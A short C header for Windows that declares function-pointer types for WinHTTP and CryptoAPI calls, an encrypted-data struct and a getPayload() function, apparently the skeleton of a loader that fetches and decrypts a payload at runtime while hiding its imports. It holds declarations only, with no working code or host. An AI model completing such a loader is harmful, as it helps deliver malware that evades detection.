//#pragma comment(lib, "winhttp.lib")

#include <windows.h>
//#include <wincrypt.h>
#include <stdio.h>
#include <winhttp.h>

typedef struct {
    LPSTR data;
    DWORD size;
} EncryptedData;

typedef HINTERNET (WINAPI* _WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef  HINTERNET (WINAPI* _WinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI* _WinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL (WINAPI* _WinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI* _WinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL (WINAPI* _WinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
typedef BOOL (WINAPI* _WinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI* _WinHttpCloseHandle)(HINTERNET);

typedef BOOL (WINAPI* _CryptAcquireContextW)(HCRYPTPROV*, LPCWSTR, LPCWSTR, DWORD, DWORD);
typedef BOOL (WINAPI* _CryptGenKey)(HCRYPTPROV, ALG_ID, DWORD, HCRYPTKEY*);
typedef BOOL (WINAPI* _CryptExportKey)(HCRYPTKEY, HCRYPTKEY, DWORD, DWORD, BYTE*, DWORD*);
typedef BOOL (WINAPI* _CryptDestroyKey)(HCRYPTKEY);
typedef BOOL (WINAPI* _CryptReleaseContext)(HCRYPTPROV, DWORD);
typedef BOOL (WINAPI* _CryptDecrypt)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*);

EncryptedData getPayload();
